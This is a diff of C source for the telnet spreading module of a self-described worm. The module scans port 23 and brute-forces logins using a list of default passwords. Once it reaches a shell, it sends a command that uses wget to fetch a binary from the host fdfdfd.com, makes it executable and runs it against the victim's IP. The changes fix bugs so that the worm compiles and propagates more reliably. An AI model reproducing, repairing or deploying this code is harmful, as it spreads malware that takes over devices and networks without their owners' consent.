@@ -9,12 +9,17 @@ w the credentials we expect there..
 #include <unistd.h>
 #include <sys/types.h>
 #include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 #include <netdb.h>
-#include "../../list.h"
-#include "../../structs.h"
-#include "../../utils.h"
+#include <stdint.h>
+#include <string.h>
+#include <time.h>
+#include "list.h"
+#include "structs.h"
+#include "utils.h"
 #include "telnet.h"
-#include "../portscan/portscan.h"
+#include "portscan.h"
 
 // distribution host for WORM
 char distribution_host[] = "fdfdfd.com";
@@ -25,6 +30,7 @@ char *passwords[] = { "root", "toor", "admin", "user", "guest", "login", "change
 "12345", "123456", "default", "pass", "password", "support", "vizxy", "cisco", NULL };
 
 typedef char *(*ExpectCMD)(Modules *, Connection *, int *size);
+int telnet_incoming(Modules *mptr, Connection *cptr, char *buf, int size);
 
 int telnet_init(Modules **);
 
@@ -79,9 +85,9 @@ CustomCredentials *custom_passwords = NULL;
 // customstate goes in connection->buf (for keeping track of brute force, etc)
 typedef struct _custom_state {
     // what username are we on..
-    int username;
+    int users;
     // what password are we on?
-    int password;
+    int passwords;
     // seconds since last expect
     unsigned int ts;
 } CustomState;
@@ -105,7 +111,7 @@ int telnet_init(Modules **_module_list) {
     Module_Add(_module_list, &HACK_Telnet);
     
     Portscan_Add(&HACK_Telnet, 23);
-    Portscan_Enable(23);
+    Portscan_Enable(23, 1);
 }
 
 char *BuildLogin(Modules *mptr, Connection *cptr, int *size) {
@@ -113,9 +119,9 @@ char *BuildLogin(Modules *mptr, Connection *cptr, int *size) {
     char *ret = NULL;
     char Auser[64];
     
-    if (passwords[Cstate->password] == NULL) {
+    if (passwords[Cstate->users] == NULL) {
         Cstate->users++;
-        Cstate->password = 0;
+        Cstate->passwords = 0;
     }
     
     // must be completed....
@@ -143,7 +149,7 @@ char *BuildPassword(Modules *mptr, Connection *cptr, int *size) {
     
     memset(Apassword, 0, 64);
     strcpy(Apassword, passwords[Cstate->passwords]);
-    strcat(Apasswqord, "\r\n");
+    strcat(Apassword, "\r\n");
     
     ret = strdup(Apassword);
     *size = strlen(ret);
@@ -153,9 +159,11 @@ char *BuildPassword(Modules *mptr, Connection *cptr, int *size) {
 
 char *BuildVerify(Modules *mptr, Connection *cptr, int *size) {
     char *ret = strdup("id;\r\n");
+    
     if (ret) {
         *size = strlen(ret);
     }
+    
     return ret;
 }
 
@@ -165,7 +173,7 @@ int str_replace_one(char **str, char *macro, char *replace) {
     int p1_size = 0;
     int p2_size = 0;
     // lets just.. calculate it all together for quickness
-    int size = strlen(str) + strlen(macro) + strlen(replace) + 1;
+    int size = strlen(*str) + strlen(macro) + strlen(replace) + 1;
     
     if ((sptr = strcasestr(*str, macro)) == NULL)
         return 0;
@@ -176,7 +184,7 @@ int str_replace_one(char **str, char *macro, char *replace) {
     p2_size = strlen(*str) - (sptr - *str);
     
     // allocate space
-    if ((ret = malloc(size + 1)) == NULL)
+    if ((ret = (char *)malloc(size + 1)) == NULL)
         return 0;
         
     memset(ret, 0, size);
@@ -204,11 +212,11 @@ void str_replace(char **str, char *macro, char *replace) {
 char *BuildWORM(Modules *mptr, Connection *cptr, int *size) {
     char cmdline[] = "wget http://%DIST%/%FNAME%;chmod +x %FNAME%;./%FNAME% %DSTIP%\r\n";
     char *ret = strdup(cmdline);
-    struct sockaddr dst;
+    struct sockaddr_in dst;
     
     // replace %IP% with the destination IP address..
-    dst.s_addr = cptr->addr;    
-    str_replace(&ret, "%DSTIP%", inet_ntoa(dst));
+    dst.sin_addr.s_addr = cptr->addr;    
+    str_replace(&ret, "%DSTIP%", inet_ntoa(dst.sin_addr));
     
     // put in the distribution host..
     str_replace(&ret, "%DIST%", distribution_host);
@@ -226,7 +234,7 @@ char *BuildWORM(Modules *mptr, Connection *cptr, int *size) {
 
 // every state has a command we want to write, what we expect to see, and then the new state if its found
 // and a module to move the command to if we need to (for privilege escalation, etc)
-typedef struct _state_commands {
+struct _state_commands {
     int state;
     char *expect;
     ExpectCMD BuildData;
@@ -238,7 +246,7 @@ typedef struct _state_commands {
     // look for password request..
     { STATE_TELNET_PASSWORD, "assword:", &BuildPassword, STATE_TELNET_FINDSHELL, NULL },
     // incorrect goes back to state new. so we can attempt another..
-    { STATE_TELNET_PASSWORD, "incorrect", &Incorrect, TCP_CONNECTED, NULL },
+    { STATE_TELNET_PASSWORD, "ncorrect", NULL, TCP_CONNECTED, NULL },
     // look for a string specifying its connected
     { STATE_TELNET_FINDSHELL, "last login", &BuildVerify, STATE_TELNET_INSIDE, NULL },
     
@@ -274,8 +282,8 @@ int telnet_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
             
             // retrieve 1 single line from the incoming queue
             recv_line = QueueParseAscii(cptr->incoming, &line_size);
-            if (!recv_line && qptr->incoming && qptr->incoming->buf) {
-                recv_line = qptr->incoming->buf;
+            if (!recv_line && cptr->incoming && cptr->incoming->buf) {
+                recv_line = cptr->incoming->buf;
                 no_line = 1;
             }
             if (recv_line) {
@@ -283,6 +291,9 @@ int telnet_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
                 if (strcasestr(recv_line, StateCommands[i].expect) != NULL) {
                     cptr->state = StateCommands[i].new_state;
                     
+                    // set timestamp to now.. so the timeout works correctly
+                    Cstate->ts = cur_ts;
+
                     if (StateCommands[i].BuildData != NULL) {
                         data = StateCommands[i].BuildData(mptr, cptr, &dsize);
                         if (data == NULL) {
@@ -294,11 +305,9 @@ int telnet_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
                         }
                         
                         // queue outgoing data..
-                        QueueAdd(mptr, cptr, data, dsize);
+                        QueueAdd(mptr, cptr, NULL, data, dsize);
                         ret = 1;
                         
-                        // set timestamp to now.. so the timeout works correctly
-                        Cstate->ts = cur_ts;
                     }
                 } 
                 // free the line.. no more use for it
@@ -341,6 +350,6 @@ int telnet_disconnect(Modules *mptr, Connection *cptr, char *buf, int size) {
     cptr->fd = 0;
     
     // if an error occurs in tcp_connect().. itll already be dealt with
-    if (tcp_connect(mptr, &cptr->list, cptr->addr, cptr->port, &conn) != 1) 
+    if (tcp_connect(mptr, cptr->list, cptr->addr, cptr->port, &conn) != 1) 
         ConnectionBad(cptr);
 }
